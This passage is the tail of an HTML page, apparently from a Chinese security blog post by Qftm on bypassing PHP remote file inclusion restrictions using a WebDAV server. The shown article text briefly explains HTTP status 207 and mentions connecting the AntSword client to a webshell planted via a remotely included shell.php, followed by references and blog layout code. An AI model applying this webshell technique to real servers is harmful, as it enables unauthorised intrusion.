+<p><img src="/2020/03/06/bypass-rfi-by-webdav/1594459-20200307030108078-1999675889.png" alt></p>
+<p>其中<code>code 207</code>是由WebDAV(RFC 2518)扩展的状态码，代表之后的消息体将是一个XML消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。</p>
+<ul>
+<li>蚁剑连接</li>
+</ul>
+<p>连接远程加载<code>shell.php</code>生成的<code>Webshell-&gt;poc.shell</code></p>
+<p><img src="/2020/03/06/bypass-rfi-by-webdav/1594459-20200307031128108-1209996740.png" alt></p>
+<p><img src="/2020/03/06/bypass-rfi-by-webdav/1594459-20200307031242751-1282235543.png" alt></p>
+<h3 id="WebDAV总结"><a href="#WebDAV总结" class="headerlink" title="WebDAV总结"></a>WebDAV总结</h3><p><code>webdav</code>如今很多人都将其作为自己的个人数据共享存储服务器，其局限性远远小于<code>SMB</code>。</p>
+<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><pre><code>http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html
+
+https://helpcenter.onlyoffice.com/server/community/connect-webdav-server-ubuntu.aspx
+</code></pre><pre><code>文章首发于安全客：https://www.anquanke.com/post/id/201060</code></pre>
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Qftm</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://Qftm.github.io/2020/03/06/bypass-rfi-by-webdav/">http://Qftm.github.io/2020/03/06/bypass-rfi-by-webdav/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint polocy. If reproduced, please indicate source
+                    <a href="/about" target="_blank">Qftm</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/PHP/">
+                                    <span class="chip bg-color">PHP</span>
+                                </a>
+                            
+                                <a href="/tags/Bypass/">
+                                    <span class="chip bg-color">Bypass</span>
+                                </a>
+                            
+                                <a href="/tags/RFI/">
+                                    <span class="chip bg-color">RFI</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2020/03/10/Linux-Electronic-Forensics/">
+                    <div class="card-image">
+                        
+                        <img src="/medias/featureimages/hack-1.jpg" class="responsive-img" alt="Linux Electronic Forensics Learning Handbook">
+                        
+                        <span class="card-title">Linux Electronic Forensics Learning Handbook</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Linux Electronic Forensics Learning Handbook声明 Author：Qftm
+ Data：2020/03/10
+ Blog：https://qftm.github.io/正文This Handbook
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-10
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/" class="post-category">
+                                    攻防渗透
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/">
+                        <span class="chip bg-color">电子取证</span>
+                    </a>
+                    
+                    <a href="/tags/Handbook/">
+                        <span class="chip bg-color">Handbook</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/02/12/Hackintosh-Of-Lenovo-R720-15IKBN/">
+                    <div class="card-image">
+                        
+                        <img src="/medias/featureimages/mac-1.jpg" class="responsive-img" alt="Hackintosh Of Lenovo R720 15IKBN">
+                        
+                        <span class="card-title">Hackintosh Of Lenovo R720 15IKBN</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Hackintosh Of Qftm一个黑苹果爱好者的项目
+定制：macOS Catalina 10.15.1
+
+电脑配置一键查看电脑配置（鲁大师、360驱动管理、Lenovo管家等）
+
+
+
+规格
+详细信息
+
+
+
+电脑型号
+Lenovo R
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-12
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Others/" class="post-category">
+                                    Others
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/MacOS/">
+                        <span class="chip bg-color">MacOS</span>
+                    </a>
+                    
+                    <a href="/tags/Hackintosh/">
+                        <span class="chip bg-color">Hackintosh</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + 'From: Qftm<br />'
+            + 'Author: Qftm<br />'
+            + 'Link: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2018</span>
+            <a href="/about" target="_blank">Qftm</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">370.8k</span>&nbsp;字
+            
+            
+            
+            
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/Qftm" 
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:Qftmbin@gmail.com" 
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+    <a href="https://twitter.com/Qftmer" 
+        <i class="fab fa-twitter"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/search.xml", 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
